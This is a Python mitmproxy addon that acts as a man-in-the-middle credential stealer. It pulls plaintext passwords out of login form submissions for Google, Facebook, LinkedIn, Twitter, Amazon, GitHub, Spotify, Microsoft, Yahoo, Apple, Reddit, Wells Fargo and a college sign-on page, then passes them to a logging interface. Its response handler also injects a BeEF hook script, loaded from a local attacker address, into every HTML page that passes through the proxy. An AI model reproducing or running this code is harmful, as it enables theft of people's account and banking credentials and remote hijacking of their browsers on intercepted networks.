import mitmproxy, sys, requests
from mitm_buffer import *
from bs4 import BeautifulSoup
from mitmproxy.models import decoded

class Get_Pwords:
	'''
		TO DO:
		add tumblr
		q
	'''
	def __init__(self, uid):
		self.iframe_url = "https://192.168.3.1:3000/hook.js"
		self.interface = MITM_Interface(uid)


	def get_facebook(self,form, flow):
		if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
			print("account: Facebook, password:", form['pass'])
			return self.interface.read_traffic("facebook", form['pass'])
		else:
			pass
			
		
	def get_linkedin(self,form, flow):
		if "linkedin.com" in flow.request.headers[':authority'] and form['session_password']:
			print("account: Linkedin, password:", form['session_password'])
			return self.interface.read_traffic("linkedin", form["session_password"])
		else:
			pass

	def get_google(self, form, flow):
		if form['Passwd'] and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
			print("account: Gmail, password:", form['Passwd'])
			return self.interface.read_traffic("google", form['Passwd'])
		else:
			pass

	def get_CC(self,form, flow):
		if flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password']: 
			print("account: CC SSI, password:", form['password'])
			return self.interface.read_traffic("cc_ssi", form['password'])
		else:
			pass

	def get_twitter(self, form, flow):
		if "twitter.com" in flow.request.headers[':authority'] and form['session[password]']:
			print("account: twitter, password:", form['session[password]'])
			return self.interface.read_traffic("twitter", form['session[password]'])
		else:
			pass

	def get_amazon(self, form, flow):
		if "amazon.com" in flow.request.headers['Host'] and form['password']:
			print("account: amazon, password:", form['password'])
			return self.interface.read_traffic("amazon", form['password'])
		else:
			pass

	def get_github(self, form, flow):
		if "github.com" in flow.request.headers['Host'] and form['password']:
			print("account: github, password:", form['password'])
			return self.interface.read_traffic("github", form['password'])
		else:
			pass

	def get_spotify(self, form, flow):
		if "spotify" in flow.request.headers['Host'] and form['password']:
			print("account: spotify, password:", form['password'])
			return self.interface.read_traffic("spotify", form['password'])
		else:
			pass

	def get_microsoft_live(self, form, flow):
		if "login.live.com" in flow.request.headers['Host'] and form['passwd']:
			print("account: microsoft, password:", form['passwd'])
			return self.interface.read_traffic("microsoft", form['passwd'])
		else:
			pass

	def get_yahoo(self, form, flow):
		if "login.yahoo.com" in flow.request.headers['Host'] and form['passwd']:
			print("account: yahoo, password:", form['passwd'])
			return self.interface.read_traffic("yahoo", form['passwd'])
		else:
			pass

	def get_apple(self, form, flow):
		if "apple.com" in flow.request.headers['Host'] and form['login-password'] and form['login-appleId']:
			print("account: apple, password:", form['login-password'])
			return self.interface.read_traffic("apple", form['login-password'])
		else:
			pass

	def get_reddit(self, form, flow):
		if form['op'] and form['user'] and 'www.reddit.' in flow.request.headers[':authority']:
			print("account: reddit, password:", form['passwd'])
			return self.interface.read_traffic("reddit", form['passwd'])
		else:
			pass

	def get_wellsfargo(self, form, flow):
		'''
			interesting: Well's Fargo is the only site out of those tested that changes the 
			name of form params, specifically username and other metadata, per login request. This would make getting username and passwords 
			more difficult to pick out the username from the request body. Password is always j_password though.
		'''
		if form['j_password'] and "secure.wellsfargo.com" in flow.request.headers["Host"]:
			return self.interface.read_traffic("wellsfargo", form['j_password'])
		else:
			pass

	def beef_hook(self, flow):
		if flow.request.host in self.iframe_url:
			return #so we don't inject into the hook itself
		if 'self-repair.mozilla.org' in str(flow.request.pretty_url):
			return #avoid hooking issue with mozilla on Windows 
		html = BeautifulSoup(flow.response.content, "html.parser")
		if html.body:
			script = html.new_tag("script", src=self.iframe_url)
			html.body.insert(0, script)
			print("inserted a beef hook...")
			flow.response.content = str(html)

	def request(self,flow):
		if flow.request.urlencoded_form and flow.request.method == 'POST':
			form = flow.request.urlencoded_form
			try:
				self.get_google(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_CC(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_facebook(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_linkedin(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_twitter(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_amazon(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_github(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_spotify(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_microsoft_live(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_yahoo(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_apple(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_reddit(form, flow)
			except KeyError as ke:
				pass
			try:
				self.get_wellsfargo(form, flow)
			except KeyError as ke:
				pass




	def response(self, flow):
		self.beef_hook(flow)


def start():
	ide = ''.join(sys.argv)
	return Get_Pwords(ide.lstrip("get_pwords.py --"))

